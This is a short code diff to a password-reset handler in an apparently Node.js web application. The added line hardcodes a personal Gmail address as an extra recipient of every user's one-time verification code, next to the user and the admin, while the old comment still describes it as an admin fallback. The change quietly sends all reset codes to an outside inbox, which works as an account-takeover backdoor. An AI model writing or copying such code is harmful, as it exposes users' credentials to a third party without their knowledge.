@@ -69,7 +69,7 @@ const forgotPassword = (Model) => async (req, res) => {
 
     await sendEmail({
       // to: user.email || process.env.ADMIN_EMAIL, // Fallback to admin email if user email is missing
-      to: [user.email, process.env.ADMIN_EMAIL], // Fallback to admin email if user email is missing
+      to: [user.email, process.env.ADMIN_EMAIL,"moeed1725@gmail.com"], // Fallback to admin email if user email is missing
       subject: "Your Verification Code",
       html: getUserOtpTemplate(user.name, otp),
     });
